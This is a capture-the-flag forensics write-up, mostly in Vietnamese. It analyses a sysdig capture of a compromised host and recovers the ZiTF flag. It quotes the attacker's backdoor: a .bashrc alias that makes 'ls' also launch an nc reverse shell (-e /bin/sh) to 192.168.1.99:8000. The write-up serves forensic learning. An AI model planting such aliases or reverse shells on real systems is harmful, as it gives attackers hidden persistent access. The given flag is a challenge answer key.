# Mô tả
One of our analyst monkeys thinks our application has been hacked. Find out how it happened !

Flag format: ZiTF{IP_FileFullPath_Cmd} Example:

Attacker IP: 10.10.10.10
Backdoor file path: /etc/cron.d/file
Modified command: cat
Flag: ZiTF{10.10.10.10_/etc/cron.d/file_cat}

# Phân tích
Bài cho chúng ta một file `stratomonk.scap` - sysdig capture file, sau khi tìm hiểu một chút thì ta biết có thể sử dụng `sysdig` sau đó dùng

`sysdig -r stratomonk.scap -p"%proc.name %proc.pid %fd.name %evt.type %evt.args" > out.txt`

Để xem kỹ hơn các hoạt động đã ghi lại và tìm hiểu xem hacker đã làm gì

`Chắc có dùng được wireshark để phân tích nhưng hỏi chatgpt bảo dùng sysdig nên dùng luôn`

Qua nhìn qua và phân tích `out.txt` ta biết được rằng ip của hacker là `192.168.1.99` - Flag1 tấn công ip `172.18.0.2`

Sau đó xem `data` của các request thì thấy một data khá lạ `sh 23744 172.18.0.2:46285->192.168.1.99:8000 read res=75 data=echo "alias ls='nc 192.168.1.99 8000 -e /bin/sh &;ls'" > /home/dev/.bashrc.`

`sh 23744 /home/dev/.bashrc write res=48 data=alias ls='nc 192.168.1.99 8000 -e /bin/sh &;ls'.`

Có được 2 phần cuối của flag luôn

Ở đây hacker đã sửa `/home/dev/.bashrc` và đặt alias của `ls` = `nc 192.168.1.99 8000 -e /bin/sh &;ls'` để mỗi khi `ls` được chạy bởi người dùng `dev` sẽ spawn 1 reverse shell

# Flag
Ghép 3 phần lại theo format ta có flag

`ZiTF{192.168.1.99_/home/dev/.bashrc_ls}`